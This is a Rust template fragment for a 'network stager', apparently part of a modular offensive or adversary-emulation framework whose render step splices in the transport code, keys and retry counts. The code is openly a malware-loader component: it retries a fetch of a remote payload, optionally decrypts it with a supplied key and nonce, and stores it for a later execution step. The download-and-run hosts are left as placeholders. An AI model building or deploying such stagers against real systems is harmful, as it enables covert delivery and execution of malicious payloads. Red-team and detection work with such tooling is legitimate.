// --- Network stager (control technique fragment) ---
//
// The fetch itself lives in the transport-specific block that `render_fragment`
// splices in below: a child downloader or the in-process WinHTTP fetch. Both
// define `fetch() -> Result<Vec<u8>, String>`; everything here is
// transport-independent — the retries, the optional staged decryption and the
// hand-off to the slot the next Execution step reads.
$TRANSPORT_CODE$

/// Reduces the retry loop to one outcome.
///
/// A fetch that succeeded on any attempt wins over the errors before it: the
/// last error is the outcome only when every attempt failed. Keeping the two
/// apart is what makes a later attempt's payload usable instead of reporting
/// the error that preceded it.
fn staged_fetch(fetched: Option<Vec<u8>>, last_error: Option<String>) -> Result<Vec<u8>, String> {
    match fetched {
        Some(bytes) => Ok(bytes),
        None => match last_error {
            Some(e) => Err(e),
            None => Err($MSG_FETCH_FAILED$),
        },
    }
}

/// Fetches the configured payload and stages it for the next Execution step.
pub fn run_exec() -> Result<i32, String> {
    let key_hex: String = $KEY_DEF$;
    let nonce_hex: String = $NONCE_DEF$;
    crate::tech_dbg!("network_stager", "fetching the staged payload");

    let mut last_error: Option<String> = None;
    let mut fetched: Option<Vec<u8>> = None;
    for _ in 0..=$RETRIES$ {
        match fetch() {
            Ok(bytes) => {
                fetched = Some(bytes);
                break;
            }
            Err(e) => {
                crate::tech_dbg!("network_stager", "fetch attempt failed: {e}");
                last_error = Some(e);
            }
        }
    }
    let mut bytes = match staged_fetch(fetched, last_error) {
        Ok(bytes) => bytes,
        Err(e) => {
            $FETCH_FAILED$
        }
    };
    crate::tech_dbg!("network_stager", "fetched {} bytes", bytes.len());

    if $CRYPTO$ {
        bytes = crate::decrypt_staged(&bytes, &nonce_hex, &key_hex)?;
    }
    crate::store_staged_payload(bytes)?;
    crate::tech_dbg!("network_stager", "payload staged");
    Ok(0)
}
